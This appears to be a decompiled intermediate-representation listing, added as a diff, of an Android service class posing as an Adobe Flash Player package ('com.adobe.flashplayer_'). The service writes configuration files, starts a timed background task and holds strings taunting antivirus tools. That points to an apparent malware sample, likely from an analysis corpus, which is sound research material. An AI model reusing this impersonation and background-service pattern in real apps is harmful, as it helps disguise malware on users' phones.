@@ -1,0 +1,83 @@
+record `com.adobe.flashplayer_.MacrosStat` @kind class @AccessFlag PUBLIC extends `android.app.Service` @kind class {
+}
+procedure `void` `<init>`(`com.adobe.flashplayer_.MacrosStat` v0 @kind this) @signature `Lcom/adobe/flashplayer_/MacrosStat;.<init>:()V` @AccessFlag PUBLIC_CONSTRUCTOR {
+    temp;
+
+  #L037574.  call `<init>`(v0) @signature `Landroid/app/Service;.<init>:()V` @kind direct;
+  #L03757a.  return @kind void;
+}
+procedure `void` `access$0`(`com.adobe.flashplayer_.MacrosStat` v0 @kind object, `java.lang.String` v1 @kind object, `java.lang.String` v2 @kind object, `android.content.Context` v3 @kind object) @signature `Lcom/adobe/flashplayer_/MacrosStat;.access$0:(Lcom/adobe/flashplayer_/MacrosStat;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V` @AccessFlag STATIC_SYNTHETIC {
+    temp;
+
+  #L03758c.  call `writeConfig`(v0, v1, v2, v3) @signature `Lcom/adobe/flashplayer_/MacrosStat;.writeConfig:(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V` @kind direct;
+  #L037592.  return @kind void;
+}
+procedure `void` `writeConfig`(`com.adobe.flashplayer_.MacrosStat` v2 @kind this, `java.lang.String` v3 @kind object @name `config`, `java.lang.String` v4 @kind object @name `data`, `android.content.Context` v5 @kind object @name `context`) @signature `Lcom/adobe/flashplayer_/MacrosStat;.writeConfig:(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V` @AccessFlag PRIVATE {
+    temp;
+    v0;
+    v1;
+
+  #L0375a4.  v0:= new `java.io.OutputStreamWriter`;
+  #L0375a8.  v1:= 0I;
+  #L0375aa.  call temp:= `openFileOutput`(v5, v3, v1) @signature `Landroid/content/Context;.openFileOutput:(Ljava/lang/String;I)Ljava/io/FileOutputStream;` @kind virtual;
+  #L0375b0.  v1:= temp @kind object;
+  #L0375b2.  call `<init>`(v0, v1) @signature `Ljava/io/OutputStreamWriter;.<init>:(Ljava/io/OutputStream;)V` @kind direct;
+  #L0375b8.  call `write`(v0, v4) @signature `Ljava/io/OutputStreamWriter;.write:(Ljava/lang/String;)V` @kind virtual;
+  #L0375be.  call `close`(v0) @signature `Ljava/io/OutputStreamWriter;.close:()V` @kind virtual;
+  #L0375c4.  return @kind void;
+  #L0375c6.  v1:= Exception @type ^`java.io.IOException` @kind object;
+  #L0375c8.  goto L0375c4;
+  catch `java.io.IOException` @[L0375a4..L0375c4] goto L0375c6;
+}
+procedure `android.os.IBinder` `onBind`(`com.adobe.flashplayer_.MacrosStat` v1 @kind this, `android.content.Intent` v2 @kind object @name `arg0`) @signature `Lcom/adobe/flashplayer_/MacrosStat;.onBind:(Landroid/content/Intent;)Landroid/os/IBinder;` @AccessFlag PUBLIC {
+    temp;
+    v0;
+
+  #L0375ec.  v0:= 0I;
+  #L0375ee.  return v0 @kind object;
+}
+procedure `void` `onCreate`(`com.adobe.flashplayer_.MacrosStat` v7 @kind this) @signature `Lcom/adobe/flashplayer_/MacrosStat;.onCreate:()V` @AccessFlag PUBLIC {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+    v5;
+    v6;
+
+  #L037600.  v2:= 180000L;
+  #L037606.  call `onCreate`(v7) @signature `Landroid/app/Service;.onCreate:()V` @kind super;
+  #L03760c.  v6:= "" @kind object;
+  #L037610.  v6:= "Hello, fuckin AVs!" @kind object;
+  #L037614.  v0:= new `java.lang.StringBuilder`;
+  #L037618.  call temp:= `valueOf`(v6) @signature `Ljava/lang/String;.valueOf:(Ljava/lang/Object;)Ljava/lang/String;` @kind static;
+  #L03761e.  v1:= temp @kind object;
+  #L037620.  call `<init>`(v0, v1) @signature `Ljava/lang/StringBuilder;.<init>:(Ljava/lang/String;)V` @kind direct;
+  #L037626.  v1:= "We have a little surprise!" @kind object;
+  #L03762a.  call temp:= `append`(v0, v1) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #L037630.  v0:= temp @kind object;
+  #L037632.  call temp:= `toString`(v0) @signature `Ljava/lang/StringBuilder;.toString:()Ljava/lang/String;` @kind virtual;
+  #L037638.  v6:= temp @kind object;
+  #L03763a.  v0:= new `java.lang.StringBuilder`;
+  #L03763e.  call temp:= `valueOf`(v6) @signature `Ljava/lang/String;.valueOf:(Ljava/lang/Object;)Ljava/lang/String;` @kind static;
+  #L037644.  v1:= temp @kind object;
+  #L037646.  call `<init>`(v0, v1) @signature `Ljava/lang/StringBuilder;.<init>:(Ljava/lang/String;)V` @kind direct;
+  #L03764c.  v1:= "Ha-ha!" @kind object;
+  #L037650.  call temp:= `append`(v0, v1) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #L037656.  v0:= temp @kind object;
+  #L037658.  call temp:= `toString`(v0) @signature `Ljava/lang/StringBuilder;.toString:()Ljava/lang/String;` @kind virtual;
+  #L03765e.  v6:= temp @kind object;
+  #L037660.  v0:= new `com.adobe.flashplayer_.MacrosStat$1`;
+  #L037664.  v1:= v7 @kind object;
+  #L037666.  v4:= v2 @kind wide;
+  #L037668.  call `<init>`(v0, v1, v2, v4) @signature `Lcom/adobe/flashplayer_/MacrosStat$1;.<init>:(Lcom/adobe/flashplayer_/MacrosStat;JJ)V` @kind direct;
+  #L03766e.  call temp:= `start`(v0) @signature `Lcom/adobe/flashplayer_/MacrosStat$1;.start:()Landroid/os/CountDownTimer;` @kind virtual;
+  #L037674.  return @kind void;
+}
+procedure `void` `onDestroy`(`com.adobe.flashplayer_.MacrosStat` v0 @kind this) @signature `Lcom/adobe/flashplayer_/MacrosStat;.onDestroy:()V` @AccessFlag PUBLIC {
+    temp;
+
+  #L037688.  call `onDestroy`(v0) @signature `Landroid/app/Service;.onDestroy:()V` @kind super;
+  #L03768e.  return @kind void;
+}
